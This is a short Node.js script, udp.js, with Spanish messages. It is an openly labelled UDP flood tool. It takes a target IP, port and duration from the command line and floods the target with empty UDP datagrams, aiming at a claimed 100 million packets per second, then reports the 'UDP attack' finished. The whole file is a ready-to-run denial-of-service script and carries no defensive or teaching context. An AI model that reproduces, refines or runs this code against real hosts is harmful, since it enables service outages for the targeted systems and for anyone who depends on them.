// udp.js
const dgram = require('dgram');

const [,, targetIP, portArg, timeArg] = process.argv;
if (!targetIP || !portArg || !timeArg) {
  console.error('Uso: node udp.js <IP> <PUERTO> <TIEMPO_EN_S>');
  process.exit(1);
}

const targetPort = parseInt(portArg, 10);
const durationSec = parseInt(timeArg, 10);

if (isNaN(targetPort) || targetPort <= 0 || targetPort > 65535) {
  console.error('Puerto inválido.');
  process.exit(1);
}

const messagesPerSecond = 100000000; // fijo e inmodificable
const intervalMs = 1000 / messagesPerSecond; // ≈ 0.00001 ms
const message = Buffer.alloc(0);
const client = dgram.createSocket('udp4');

let sentCount = 0;
const floodInterval = setInterval(() => {
  client.send(message, 0, message.length, targetPort, targetIP, err => {
    if (!err) sentCount++;
  });
}, intervalMs);

console.log(`🚀 Enviando ~${messagesPerSecond} pps a ${targetIP}:${targetPort} por ${durationSec}s`);

setTimeout(() => {
  clearInterval(floodInterval);
  client.close();
  console.log(`✅ Ataque UDP finalizado. Total aproximado enviado: ${sentCount}`);
  process.exit(0);
}, durationSec * 1000);
